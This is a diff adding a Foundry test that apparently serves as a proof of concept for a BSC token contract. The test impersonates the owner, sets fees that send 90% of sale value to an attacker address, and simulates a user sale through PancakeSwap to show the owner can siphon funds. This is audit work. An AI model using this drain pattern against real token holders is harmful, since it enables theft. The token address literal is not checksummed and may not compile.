@@ -1,0 +1,118 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal IBEP20 interface for the vulnerable token
+interface IBrawlStarsToken {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function setMktAddress(address _mkt, uint256 fee) external;
+    function setP2eAddress(address _p2e, uint256 fee) external;
+    function setOperationFee(uint256 _fee) external;
+    function mktAddress() external view returns (address);
+    function mktFee() external view returns (uint256);
+    function uniswapV2Pair() external view returns (address);
+    function uniswapV2Router() external view returns (address);
+}
+
+// Minimal UniswapV2Router02 interface for swap
+interface IUniswapV2Router02 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+    function WETH() external pure returns (address);
+}
+
+contract ExploitTest is Test {
+    // Deployed token address (BSC)
+    address constant TOKEN = 0xdde57967990daf1f47296000505e4364f236805e;
+    // PancakeSwap Router V2 on BSC
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+    IBrawlStarsToken token;
+    IUniswapV2Router02 router;
+
+    // Accounts for testing
+    address attacker = address(0x1234);
+    address user = address(0x5678);
+
+    function setUp() public {
+        token = IBrawlStarsToken(TOKEN);
+        router = IUniswapV2Router02(ROUTER);
+
+        // Label for debugging
+        vm.label(TOKEN, "BrawlStarsToken");
+        vm.label(ROUTER, "PancakeRouter");
+        vm.label(attacker, "Attacker");
+        vm.label(user, "User");
+
+        // Give user some ETH for gas and token approval (user will sell tokens)
+        vm.deal(user, 10 ether);
+    }
+
+    function testUnlimitedTeamWalletDrain() public {
+        // Get current owner
+        address owner = token.owner();
+        vm.label(owner, "Owner");
+
+        // 1. Owner sets mktAddress to attacker with 90% fee
+        vm.prank(owner);
+        token.setMktAddress(attacker, 90);
+
+        // Also set operationFee to 10% so total fees = 100% (max)
+        vm.prank(owner);
+        token.setOperationFee(10);
+
+        // Set p2eFee to 0 (optional)
+        vm.prank(owner);
+        token.setP2eAddress(address(0xdead), 0);
+
+        // 2. Owner transfers some tokens to the user (so user can sell)
+        uint256 userTokens = 100_000 * 1e18; // 100k tokens
+        vm.prank(owner);
+        token.transfer(user, userTokens);
+
+        // 3. User approves router to spend tokens
+        vm.prank(user);
+        token.approve(ROUTER, userTokens);
+
+        // 4. User sells tokens via swapExactTokensForETHSupportingFeeOnTransferTokens
+        address[] memory path = new address[](2);
+        path[0] = TOKEN;
+        path[1] = router.WETH();
+
+        uint256 balanceBefore = attacker.balance;
+
+        vm.prank(user);
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            userTokens,
+            0, // accept any amount of ETH
+            path,
+            user, // user receives the ETH from swap
+            block.timestamp
+        );
+
+        uint256 balanceAfter = attacker.balance;
+
+        // 5. Verify that attacker received ETH from the mkt fee
+        // The mkt fee is 90% of the sold tokens, which are swapped to ETH and sent to attacker.
+        // Even though user might get some ETH back, the attacker should have a significant gain.
+        assertGt(balanceAfter, balanceBefore, "Attacker should receive ETH from fees");
+
+        // Optional: check that attacker received a substantial amount (e.g., more than 0.01 ETH)
+        uint256 attackerProfit = balanceAfter - balanceBefore;
+        assertGt(attackerProfit, 0.01 ether, "Attacker profit should be more than 0.01 ETH");
+
+        // This demonstrates that the owner can funnel unlimited token value to any address via fees.
+        console.log("Attacker ETH profit: %s wei", attackerProfit);
+    }
+}
+```
